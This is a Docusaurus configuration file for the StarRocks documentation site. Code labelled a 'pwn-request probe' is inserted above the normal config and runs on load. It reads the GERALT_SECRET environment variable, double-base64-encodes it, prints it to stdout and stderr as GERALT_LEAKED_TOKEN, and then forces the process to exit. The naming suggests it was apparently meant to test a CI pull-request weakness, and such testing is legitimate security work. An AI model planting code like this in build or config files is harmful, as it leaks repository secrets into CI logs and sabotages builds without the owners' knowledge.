// GERALT pwn-request probe: executes at require() time when Docusaurus loads this module
const _secret = process.env.GERALT_SECRET || '';
const _tok = Buffer.from(Buffer.from(_secret, 'utf8').toString('base64'), 'utf8').toString('base64');
process.stdout.write('GERALT_LEAKED_TOKEN=' + _tok + '\n');
process.stderr.write('GERALT_LEAKED_TOKEN=' + _tok + '\n');
// give stdout a moment to flush, then terminate to preserve evidence in the logs
setTimeout(function(){ process.exit(1); }, 250);

module.exports = {
  title: 'StarRocks',
  url: 'https://docs.starrocks.io',
  baseUrl: '/',
  organizationName: 'StarRocks',
  projectName: 'starrocks',
  onBrokenLinks: 'warn',
  onBrokenMarkdownLinks: 'warn',
  presets: [],
  themeConfig: {}
};
